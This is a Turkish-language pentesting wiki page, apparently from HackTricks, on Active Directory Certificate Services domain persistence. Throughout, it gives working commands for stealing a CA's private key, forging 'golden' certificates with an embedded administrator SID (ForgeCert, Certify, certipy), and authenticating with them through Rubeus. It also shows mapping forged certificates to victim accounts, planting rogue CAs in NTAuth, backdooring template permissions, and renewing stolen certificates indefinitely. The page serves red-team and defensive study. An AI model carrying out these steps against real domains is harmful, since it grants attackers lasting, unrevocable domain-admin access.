# AD CS Domain Persistence

{{#include ../../../banners/hacktricks-training.md}}

**Bu, [https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf) adresinde paylaşılan domain persistence tekniklerinin bir özetidir**. Daha fazla ayrıntı için belgeyi inceleyin.<sup>[[5]](#references)</sup>

## Stolen CA Certificates ile Certificate Forging (Golden Certificate) - DPERSIST1

Bir sertifikanın CA sertifikası olduğunu nasıl anlayabilirsiniz?

Bir sertifikanın CA sertifikası olduğu, birkaç koşul karşılanıyorsa belirlenebilir:<sup>[[5]](#references)</sup>

- Sertifika, private key'i makinenin DPAPI'si veya işletim sistemi destekliyorsa TPM/HSM gibi donanımlar tarafından güvence altına alınmış şekilde CA server üzerinde depolanır.
- Sertifikanın Issuer ve Subject alanları, CA'nın distinguished name'i ile eşleşir.
- Yalnızca CA sertifikalarında bulunan bir "CA Version" extension'ı mevcuttur.
- Sertifikada Extended Key Usage (EKU) alanları bulunmaz.

Bu sertifikanın private key'ini çıkarmak için CA server üzerindeki `certsrv.msc` aracı, yerleşik GUI üzerinden desteklenen yöntemdir. Bununla birlikte bu sertifika, sistem içinde depolanan diğer sertifikalardan farklı değildir; bu nedenle çıkarma işlemi için [THEFT2 technique](certificate-theft.md#user-certificate-theft-via-dpapi-theft2) gibi yöntemler uygulanabilir.

Sertifika ve private key, aşağıdaki komut kullanılarak Certipy ile de elde edilebilir:<sup>[[2]](#references)</sup>
```bash
certipy ca 'corp.local/administrator@ca.corp.local' -hashes :123123.. -backup
```
CA sertifikası ve özel anahtarı `.pfx` formatında ele geçirildikten sonra, geçerli sertifikalar oluşturmak için [ForgeCert](https://github.com/GhostPack/ForgeCert) gibi araçlar kullanılabilir:
```bash
# Generating a new certificate with ForgeCert
ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123! --Subject "CN=User" --SubjectAltName localadmin@theshire.local --NewCertPath localadmin.pfx --NewCertPassword Password123!

# Generating a new certificate with certipy
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local -subject 'CN=Administrator,CN=Users,DC=CORP,DC=LOCAL'

# Authenticating using the new certificate with Rubeus
Rubeus.exe asktgt /user:localdomain /certificate:C:\ForgeCert\localadmin.pfx /password:Password123!

# Authenticating using the new certificate with certipy
certipy auth -pfx administrator_forged.pfx -dc-ip 172.16.126.128
```
> [!WARNING]
> Certificate forgery için hedeflenen kullanıcı aktif olmalı ve işlemin başarılı olması için Active Directory'de kimlik doğrulaması yapabilmelidir. krbtgt gibi özel hesaplar için certificate forgery yapmak etkisizdir.

Bu forged certificate, belirtilen bitiş tarihine kadar ve **root CA certificate geçerli olduğu sürece** (**genellikle 5 ila **10+ yıl**) **geçerli** olacaktır. Ayrıca **makineler için** de geçerlidir; bu nedenle **S4U2Self** ile birlikte bir attacker, CA certificate geçerli olduğu sürece **herhangi bir domain makinesinde persistence sağlayabilir**.\
Bunun yanı sıra, bu yöntemle **oluşturulan certificates**, CA bunlardan haberdar olmadığı için **revoke edilemez**.

### Strong Certificate Mapping Enforcement altında çalışma (2025+)

11 Şubat 2025'ten beri (KB5014754 rollout sonrasında), domain controllers certificates mappings için varsayılan olarak **Full Enforcement** kullanır. Pratikte bu, forged certificates'ınızın aşağıdakilerden birini içermesi gerektiği anlamına gelir:

- Hedef hesaba strong bir binding içermeli (örneğin SID security extension), veya
- Hedef object'in `altSecurityIdentities` attribute'unda strong ve explicit bir mapping ile eşleştirilmelidir.<sup>[[1]](#references)</sup>

Persistence için güvenilir bir yaklaşım, stolen Enterprise CA'ya chained bir forged certificate mint etmek ve ardından victim principal'a strong bir explicit mapping eklemektir:
```powershell
# Example: map a forged cert to a target account using Issuer+Serial (strong mapping)
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'           # reverse DN format expected by AD
$SerialR = '1200000000AC11000000002B'                  # serial in reversed byte order
$Map     = "X509:<I>$Issuer<SR>$SerialR"             # strong mapping format
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Notlar
- SID güvenlik uzantısını içeren sahte sertifikalar oluşturabiliyorsanız, bunlar Full Enforcement altında bile örtük olarak eşleşir. Aksi takdirde açık güçlü eşlemeleri tercih edin. Açık eşlemeler hakkında daha fazla bilgi için [account-persistence](account-persistence.md) sayfasına bakın.
- Revocation burada savunuculara yardımcı olmaz: sahte sertifikalar CA veritabanı tarafından bilinmez ve bu nedenle iptal edilemez.

#### Full-Enforcement uyumlu forging (SID-aware)

Güncellenen araçlar, SID'yi doğrudan gömmenize olanak tanır ve DC'ler zayıf eşlemeleri reddetse bile golden certificates kullanılabilir durumda kalır:<sup>[[3]](#references)</sup>
```bash
# Certify 2.0 integrates ForgeCert and can embed SID
Certify.exe forge --ca-pfx CORP-DC-CA.pfx --ca-pass Password123! \
--upn administrator@corp.local --sid S-1-5-21-1111111111-2222222222-3333333333-500 \
--outfile administrator_sid.pfx

# Certipy also supports SID in forged certs
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local \
-sid S-1-5-21-1111111111-2222222222-3333333333-500 -out administrator_sid.pfx
```
SID'yi gömerek izlenebilecek `altSecurityIdentities` nesnesine dokunmanız gerekmez; aynı zamanda güçlü eşleme kontrollerini de karşılamış olursunuz.

## Rogue CA Certificates'a Güvenme - DPERSIST2

`NTAuthCertificates` nesnesi, Active Directory'nin (AD) kullandığı `cacertificate` özniteliği içinde bir veya daha fazla **CA certificate** bulunduracak şekilde tanımlanmıştır. **domain controller** tarafından gerçekleştirilen doğrulama süreci, kimlik doğrulayan **certificate**'ın Issuer alanında belirtilen **CA** ile eşleşen bir girdiyi `NTAuthCertificates` nesnesinde arar. Eşleşme bulunursa kimlik doğrulama işlemi devam eder.<sup>[[5]](#references)</sup>

Bir saldırgan, bu AD nesnesi üzerinde denetime sahipse `NTAuthCertificates` nesnesine self-signed bir CA certificate ekleyebilir. Normalde yalnızca **Enterprise Admin** grubunun üyelerine ve **forest root’s domain** içindeki **Domain Admins** veya **Administrators** gruplarına bu nesneyi değiştirme izni verilir. Bu kişiler `certutil.exe` kullanarak `certutil.exe -dspublish -f C:\Temp\CERT.crt NTAuthCA` komutuyla veya [**PKI Health Tool**](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/import-third-party-ca-to-enterprise-ntauth-store#method-1---import-a-certificate-by-using-the-pki-health-tool) aracılığıyla `NTAuthCertificates` nesnesini düzenleyebilir.

Bu technique için ek yararlı komutlar:
```bash
# Add/remove and inspect the Enterprise NTAuth store
certutil -enterprise -f -AddStore NTAuth C:\Temp\CERT.crt
certutil -enterprise -viewstore NTAuth
certutil -enterprise -delstore NTAuth <Thumbprint>

# (Optional) publish into AD CA containers to improve chain building across the forest
certutil -dspublish -f C:\Temp\CERT.crt RootCA          # CN=Certification Authorities
certutil -dspublish -f C:\Temp\CERT.crt CA               # CN=AIA
```
Bu yetenek, daha önce açıklanan ve dinamik olarak certificates oluşturmak için ForgeCert kullanılan yöntemle birlikte kullanıldığında özellikle önemlidir.

> Post-2025 mapping considerations: Rogue bir CA'yı NTAuth içine yerleştirmek yalnızca issuing CA'ya güven tesis eder. DC'ler **Full Enforcement** durumundayken logon için leaf certificates kullanmak amacıyla leaf certificate ya SID security extension içermeli ya da hedef nesne üzerinde güçlü bir explicit mapping bulunmalıdır (örneğin `altSecurityIdentities` içinde Issuer+Serial). Bkz. {{#ref}}account-persistence.md{{#endref}}.

## Kötü Amaçlı Yanlış Yapılandırma - DPERSIST3

**persistence** için **security descriptor modifications of AD CS** bileşenleri üzerinden fırsatlar oldukça fazladır. "[Domain Escalation](domain-escalation.md)" bölümünde açıklanan değişiklikler, elevated access sahibi bir attacker tarafından kötü amaçlı şekilde uygulanabilir. Buna aşağıdakiler gibi hassas bileşenlere "control rights" (ör. WriteOwner/WriteDACL/etc.) eklenmesi dahildir:<sup>[[5]](#references)</sup>

- **CA server’s AD computer** nesnesi
- **CA server’s RPC/DCOM server**
- **`CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`** içindeki herhangi bir **descendant AD object or container** (örneğin Certificate Templates container, Certification Authorities container, NTAuthCertificates object vb.)
- Varsayılan olarak veya kuruluş tarafından AD CS'yi kontrol etmek üzere yetkilendirilmiş **AD groups** (yerleşik Cert Publishers grubu ve üyelerinden herhangi biri gibi)

Kötü amaçlı uygulamaya örnek olarak, domain'de **elevated permissions** sahibi bir attacker's, varsayılan **`User`** certificate template'ine **`WriteOwner`** izni eklemesi ve bu hak için attacker'ı principal olarak belirlemesi verilebilir. Bunu exploit etmek için attacker öncelikle **`User`** template'inin ownership'ini kendisine değiştirir. Ardından, request içinde bir Subject Alternative Name sağlanmasını mümkün kılmak üzere template üzerinde **`mspki-certificate-name-flag`** değeri **1** olarak ayarlanarak **`ENROLLEE_SUPPLIES_SUBJECT`** etkinleştirilir. Sonrasında attacker, **template** kullanarak **enroll** olabilir, alternative name olarak bir **domain administrator** adı seçebilir ve elde edilen certificate'ı DA olarak authentication için kullanabilir.

Saldırganların uzun vadeli domain persistence için ayarlayabileceği pratik seçenekler (ayrıntılar ve detection için {{#ref}}domain-escalation.md{{#endref}} bölümüne bakın):

- Requester'lardan SAN'a izin veren CA policy flags (ör. `EDITF_ATTRIBUTESUBJECTALTNAME2` etkinleştirilmesi). Bu, ESC1 benzeri yolların exploit edilebilir kalmasını sağlar.
- Authentication-capable issuance sağlayan template DACL veya settings (ör. Client Authentication EKU eklenmesi, `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` etkinleştirilmesi).
- Defenders cleanup yapmaya çalışsa bile rogue issuer'ları sürekli olarak yeniden eklemek için `NTAuthCertificates` object'ini veya CA containers'ı kontrol etmek.

> [!TIP]
> KB5014754 sonrasında hardened ortamlarda, bu yanlış yapılandırmaların explicit strong mappings (`altSecurityIdentities`) ile birlikte kullanılması, DC'ler strong mapping uygulasa bile issued veya forged certificates'ın kullanılabilir kalmasını sağlar.

### Persistence için certificate renewal abuse (ESC14)

Authentication-capable bir certificate'ı (veya Enrollment Agent certificate'ını) compromise ederseniz, issuing template published kaldığı ve CA'nın issuer chain'e güvenmeye devam ettiği sürece bunu **indefinitely** yenileyebilirsiniz. Renewal, original identity bindings'leri korurken validity süresini uzatır; bu da template düzeltilmediği veya CA yeniden yayınlanmadığı sürece eviction'ı zorlaştırır.<sup>[[4]](#references)</sup>
```bash
# Renew a stolen user cert to extend validity
certipy req -ca CORP-DC-CA -template User -pfx stolen_user.pfx -renew -out user_renewed_2026.pfx

# Renew an on-behalf-of cert issued via an Enrollment Agent
certipy req -ca CORP-DC-CA -on-behalf-of 'CORP/victim' -pfx agent.pfx -renew -out victim_renewed.pfx
```
Domain controller'lar **Full Enforcement** durumundaysa, `-sid <victim SID>` ekleyin (veya SID security extension'ı hâlâ içeren bir template kullanın); böylece yenilenen leaf certificate, `altSecurityIdentities` üzerinde değişiklik yapılmadan güçlü şekilde eşleşmeye devam eder. CA admin rights'e sahip saldırganlar, kendilerine bir certificate vermeden önce yenilenen ömürleri uzatmak için `policy\RenewalValidityPeriodUnits` değerini de değiştirebilir.<sup>[[2]](#references)[[4]](#references)</sup>


## Referanslar

- [1] [Microsoft KB5014754 – Certificate-based authentication changes on Windows domain controllers (enforcement timeline and strong mappings)](https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16)
- [2] [Certipy – Command Reference and forge/auth usage](https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference)
- [3] [SpecterOps – Certify 2.0 (integrated forge with SID support)](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [4] [ESC14 renewal abuse overview](https://www.adcs-security.com/attacks/esc14)
- [5] [SpecterOps – Certified Pre-Owned: Abusing Active Directory Certificate Services](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf)

{{#include ../../../banners/hacktricks-training.md}}
